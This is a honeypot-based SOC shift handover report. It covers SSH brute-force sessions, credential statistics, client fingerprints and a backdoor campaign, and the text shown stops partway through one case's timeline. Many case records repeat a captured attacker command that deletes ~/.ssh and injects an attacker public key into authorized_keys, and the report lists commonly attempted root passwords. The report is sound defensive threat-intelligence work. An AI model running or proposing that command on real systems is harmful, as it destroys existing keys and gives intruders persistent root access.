# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-26 |
| **Generated At** | 2026-05-26T21:48:54Z |
| **Shift Time** | 21:48 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **95** |
| Confirmed Threats | **87** |
| False Positives Filtered | **8** (8.4%) |
| Unique Attacker IPs | **27** |
| Countries of Origin | **11** |
| High Severity Cases | **23** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **72** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **51** |
| Unique Credential Pairs | **31** |
| Unique Usernames | **17** |
| Unique Passwords | **30** |
| Successful Auth Pairs | **16** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 24 |
| `345gs5662d34` | 11 |
| `ubuntu` | 2 |
| `mcserver` | 1 |
| `admin` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 11 |
| `3245gs5662d34` | 11 |
| `fjbdfdjkdsfs541544AA@@` | 2 |
| `Sz123456` | 1 |
| `mcserver` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 11 |
| `root` | `3245gs5662d34` | 11 |
| `root` | `Sz123456` | 1 |
| `mcserver` | `mcserver` | 1 |
| `root` | `Admin@12` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Sz123456` | `118.36.136.12` | 2026-05-26T18:44:58 |
| `root` | `3245gs5662d34` | `118.36.136.12` | 2026-05-26T18:45:01 |
| `root` | `Admin@12` | `81.9.145.130` | 2026-05-26T18:55:03 |
| `root` | `3245gs5662d34` | `81.9.145.130` | 2026-05-26T18:55:08 |
| `root` | `2025` | `81.9.145.130` | 2026-05-26T18:57:25 |
| `root` | `Mm123456@` | `101.126.54.66` | 2026-05-26T19:04:38 |
| `root` | `3245gs5662d34` | `101.126.54.66` | 2026-05-26T19:04:42 |
| `root` | `Aa@112233` | `81.9.145.130` | 2026-05-26T19:11:03 |
| `root` | `Abc123abc` | `81.9.145.130` | 2026-05-26T19:13:21 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `81.9.145.130` | 2026-05-26T19:18:08 |
| `root` | `fjbdfdjkdsfs541544@@` | `81.9.145.130` | 2026-05-26T19:22:38 |
| `root` | `abcd@1234` | `81.9.145.130` | 2026-05-26T19:26:57 |
| `root` | `Root2025` | `81.9.145.130` | 2026-05-26T19:36:25 |
| `root` | `Linux@321` | `212.51.34.150` | 2026-05-26T20:11:06 |
| `root` | `3245gs5662d34` | `212.51.34.150` | 2026-05-26T20:11:11 |
| `root` | `admin` | `192.42.116.112` | 2026-05-26T21:21:43 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **95** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 51 |
| Go SSH scanner | 1 |
| OpenSSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 40 | 3 |
| `f555226df196...` | Mirai/variant | 11 | 5 |
| `2aec6b44b06b...` | Mirai/variant | 1 | 1 |
| `1cc79c7da9b5...` | libssh-based | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 40 | 3 | Modern SSH client |
| `f555226df196...` | libssh | 11 | 5 | Mirai/variant |
| `2aec6b44b06b...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `1cc79c7da9b5...` | OpenSSH | 1 | 1 | libssh-based |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 11 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `212.51.34.150`, `81.9.145.130`, `101.126.54.66`, `118.36.136.12`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **27** |
| Unique ASNs | **21** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | LOW |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS14987` | Rethem Hosting LLC | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS18403` | FPT Telecom Company | 1 | LOW |
| `AS4134` | CHINANET BACKBONE | 1 | LOW |
| `AS53667` | FranTech Solutions | 1 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (23)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b80637d686d1

| Field | Detail |
|---|---|
| **Source IP** | `118.36.136[.]12` |
| **First Seen** | 2026-05-26 18:44 |
| **Last Seen** | 2026-05-26 18:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 18:44:57` | `cowrie.session.connect` |
| `2026-05-26 18:44:57` | `cowrie.client.version` |
| `2026-05-26 18:44:57` | `cowrie.client.kex` |
| `2026-05-26 18:44:58` | `cowrie.login.success` |
| `2026-05-26 18:44:58` | `cowrie.session.params` |
| `2026-05-26 18:44:58` | `cowrie.command.input` |
| `2026-05-26 18:44:58` | `cowrie.command.failed` |
| `2026-05-26 18:44:58` | `cowrie.log.closed` |
| `2026-05-26 18:44:58` | `cowrie.session.params` |
| `2026-05-26 18:44:58` | `cowrie.command.input` |
| `2026-05-26 18:44:58` | `cowrie.session.file_download` |
| `2026-05-26 18:44:58` | `cowrie.log.closed` |
| `2026-05-26 18:45:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.36.136[.]12` to AbuseIPDB if not already reported
- [ ] Block `118.36.136[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6fa7075f4de

| Field | Detail |
|---|---|
| **Source IP** | `118.36.136[.]12` |
| **First Seen** | 2026-05-26 18:45 |
| **Last Seen** | 2026-05-26 18:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 18:45:00` | `cowrie.session.connect` |
| `2026-05-26 18:45:00` | `cowrie.client.version` |
| `2026-05-26 18:45:01` | `cowrie.client.kex` |
| `2026-05-26 18:45:01` | `cowrie.login.success` |
| `2026-05-26 18:45:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.36.136[.]12` to AbuseIPDB if not already reported
- [ ] Block `118.36.136[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3e1ed6504c7

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-26 18:55 |
| **Last Seen** | 2026-05-26 18:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 18:55:02` | `cowrie.session.connect` |
| `2026-05-26 18:55:02` | `cowrie.client.version` |
| `2026-05-26 18:55:02` | `cowrie.client.kex` |
| `2026-05-26 18:55:03` | `cowrie.login.success` |
| `2026-05-26 18:55:03` | `cowrie.session.params` |
| `2026-05-26 18:55:03` | `cowrie.command.input` |
| `2026-05-26 18:55:03` | `cowrie.command.failed` |
| `2026-05-26 18:55:04` | `cowrie.log.closed` |
| `2026-05-26 18:55:04` | `cowrie.session.params` |
| `2026-05-26 18:55:04` | `cowrie.command.input` |
| `2026-05-26 18:55:04` | `cowrie.session.file_download` |
| `2026-05-26 18:55:04` | `cowrie.log.closed` |
| `2026-05-26 18:55:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abfa92bb3d26

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-26 18:55 |
| **Last Seen** | 2026-05-26 18:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 18:55:07` | `cowrie.session.connect` |
| `2026-05-26 18:55:07` | `cowrie.client.version` |
| `2026-05-26 18:55:07` | `cowrie.client.kex` |
| `2026-05-26 18:55:08` | `cowrie.login.success` |
| `2026-05-26 18:55:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e9de28a3e6d

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-26 18:57 |
| **Last Seen** | 2026-05-26 18:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 18:57:24` | `cowrie.session.connect` |
| `2026-05-26 18:57:24` | `cowrie.client.version` |
| `2026-05-26 18:57:25` | `cowrie.client.kex` |
| `2026-05-26 18:57:25` | `cowrie.login.success` |
| `2026-05-26 18:57:26` | `cowrie.session.params` |
| `2026-05-26 18:57:26` | `cowrie.command.input` |
| `2026-05-26 18:57:26` | `cowrie.command.failed` |
| `2026-05-26 18:57:26` | `cowrie.log.closed` |
| `2026-05-26 18:57:26` | `cowrie.session.params` |
| `2026-05-26 18:57:26` | `cowrie.command.input` |
| `2026-05-26 18:57:27` | `cowrie.session.file_download` |
| `2026-05-26 18:57:27` | `cowrie.log.closed` |
| `2026-05-26 18:57:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecfadc350f62

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-26 18:57 |
| **Last Seen** | 2026-05-26 18:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 18:57:29` | `cowrie.session.connect` |
| `2026-05-26 18:57:29` | `cowrie.client.version` |
| `2026-05-26 18:57:29` | `cowrie.client.kex` |
| `2026-05-26 18:57:30` | `cowrie.login.success` |
| `2026-05-26 18:57:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d837f542260c

| Field | Detail |
|---|---|
| **Source IP** | `101.126.54[.]66` |
| **First Seen** | 2026-05-26 19:04 |
| **Last Seen** | 2026-05-26 19:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 19:04:38` | `cowrie.session.connect` |
| `2026-05-26 19:04:38` | `cowrie.client.version` |
| `2026-05-26 19:04:38` | `cowrie.client.kex` |
| `2026-05-26 19:04:38` | `cowrie.login.success` |
| `2026-05-26 19:04:39` | `cowrie.session.params` |
| `2026-05-26 19:04:39` | `cowrie.command.input` |
| `2026-05-26 19:04:39` | `cowrie.command.failed` |
| `2026-05-26 19:04:39` | `cowrie.log.closed` |
| `2026-05-26 19:04:39` | `cowrie.session.params` |
| `2026-05-26 19:04:39` | `cowrie.command.input` |
| `2026-05-26 19:04:39` | `cowrie.session.file_download` |
| `2026-05-26 19:04:39` | `cowrie.log.closed` |
| `2026-05-26 19:04:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.54[.]66` to AbuseIPDB if not already reported
- [ ] Block `101.126.54[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-828c53b74a72

| Field | Detail |
|---|---|
| **Source IP** | `101.126.54[.]66` |
| **First Seen** | 2026-05-26 19:04 |
| **Last Seen** | 2026-05-26 19:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 19:04:42` | `cowrie.session.connect` |
| `2026-05-26 19:04:42` | `cowrie.client.version` |
| `2026-05-26 19:04:42` | `cowrie.client.kex` |
| `2026-05-26 19:04:42` | `cowrie.login.success` |
| `2026-05-26 19:04:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.54[.]66` to AbuseIPDB if not already reported
- [ ] Block `101.126.54[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee91fa64387d

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-26 19:11 |
| **Last Seen** | 2026-05-26 19:11 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 19:11:02` | `cowrie.session.connect` |
| `2026-05-26 19:11:02` | `cowrie.client.version` |
| `2026-05-26 19:11:02` | `cowrie.client.kex` |
| `2026-05-26 19:11:03` | `cowrie.login.success` |
| `2026-05-26 19:11:04` | `cowrie.session.params` |
| `2026-05-26 19:11:04` | `cowrie.command.input` |
| `2026-05-26 19:11:04` | `cowrie.command.failed` |
| `2026-05-26 19:11:04` | `cowrie.log.closed` |
| `2026-05-26 19:11:04` | `cowrie.session.params` |
| `2026-05-26 19:11:04` | `cowrie.command.input` |
| `2026-05-26 19:11:04` | `cowrie.session.file_download` |
| `2026-05-26 19:11:04` | `cowrie.log.closed` |
| `2026-05-26 19:11:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99817c19e120

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-26 19:11 |
| **Last Seen** | 2026-05-26 19:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 19:11:07` | `cowrie.session.connect` |
| `2026-05-26 19:11:07` | `cowrie.client.version` |
| `2026-05-26 19:11:07` | `cowrie.client.kex` |
| `2026-05-26 19:11:08` | `cowrie.login.success` |
| `2026-05-26 19:11:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17434c0e8fed

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-26 19:13 |
| **Last Seen** | 2026-05-26 19:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 19:13:20` | `cowrie.session.connect` |
| `2026-05-26 19:13:20` | `cowrie.client.version` |
| `2026-05-26 19:13:20` | `cowrie.client.kex` |
| `2026-05-26 19:13:21` | `cowrie.login.success` |
| `2026-05-26 19:13:21` | `cowrie.session.params` |
| `2026-05-26 19:13:21` | `cowrie.command.input` |
| `2026-05-26 19:13:21` | `cowrie.command.failed` |
| `2026-05-26 19:13:21` | `cowrie.log.closed` |
| `2026-05-26 19:13:22` | `cowrie.session.params` |
| `2026-05-26 19:13:22` | `cowrie.command.input` |
| `2026-05-26 19:13:22` | `cowrie.session.file_download` |
| `2026-05-26 19:13:22` | `cowrie.log.closed` |
| `2026-05-26 19:13:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fd80f5daa9f

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-26 19:13 |
| **Last Seen** | 2026-05-26 19:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 19:13:24` | `cowrie.session.connect` |
| `2026-05-26 19:13:24` | `cowrie.client.version` |
| `2026-05-26 19:13:25` | `cowrie.client.kex` |
| `2026-05-26 19:13:25` | `cowrie.login.success` |
| `2026-05-26 19:13:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0520f2b8131e

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-26 19:18 |
| **Last Seen** | 2026-05-26 19:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 19:18:07` | `cowrie.session.connect` |
| `2026-05-26 19:18:07` | `cowrie.client.version` |
| `2026-05-26 19:18:07` | `cowrie.client.kex` |
| `2026-05-26 19:18:08` | `cowrie.login.success` |
| `2026-05-26 19:18:08` | `cowrie.session.params` |
| `2026-05-26 19:18:08` | `cowrie.command.input` |
| `2026-05-26 19:18:08` | `cowrie.command.failed` |
| `2026-05-26 19:18:08` | `cowrie.log.closed` |
| `2026-05-26 19:18:09` | `cowrie.session.params` |
